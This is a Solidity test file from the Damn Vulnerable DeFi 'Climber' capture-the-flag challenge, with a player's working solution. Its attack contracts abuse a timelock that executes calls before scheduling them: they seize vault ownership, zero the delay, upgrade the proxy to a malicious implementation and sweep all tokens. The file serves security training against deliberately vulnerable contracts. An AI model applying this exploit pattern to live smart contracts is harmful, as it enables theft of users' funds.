// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        //yes, i looked at solution, but i got good understanding of this now
        ClimberAttack attack = new ClimberAttack(timelock, vault, recovery);
        attack.attack(address(token));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}



contract ClimberVaultV2 is ClimberVault {
    function sweepFunds(address token, address recovery) external {
        IERC20(token).transfer(recovery, IERC20(token).balanceOf(address(this)));
    }
}

contract AttackPropose {
    ClimberTimelock timelock;
    ClimberVault vault;
    address climberAttacker;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, address _climberAttacker) {
        timelock = _timelock;
        vault = _vault;
        climberAttacker = _climberAttacker;
    }

    function proposeSchedule() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(vault.transferOwnership, (climberAttacker));

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));

        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(timelock.updateDelay, (0));

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(AttackPropose.proposeSchedule, ());

        timelock.schedule(targets, values, dataElements, 0);
    }
}

contract ClimberAttack {
    ClimberTimelock timelock;
    ClimberVault vault;
    address recovery;

    constructor(ClimberTimelock _timelock, ClimberVault _vault, address _recovery) {
        timelock = _timelock;
        vault = _vault;
        recovery = _recovery;
    }

    function attack(address token) external {
        AttackPropose proposer = new AttackPropose(timelock, vault, address(this));

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[0] = address(vault);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(vault.transferOwnership, (address(this)));

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(proposer)));

        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(timelock.updateDelay, (0));

        targets[3] = address(proposer);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(AttackPropose.proposeSchedule, ());

        timelock.execute(targets, values, dataElements, 0);
        vault.upgradeToAndCall(address(new ClimberVaultV2()), "");
        ClimberVaultV2(address(vault)).sweepFunds(token, recovery);
    }
}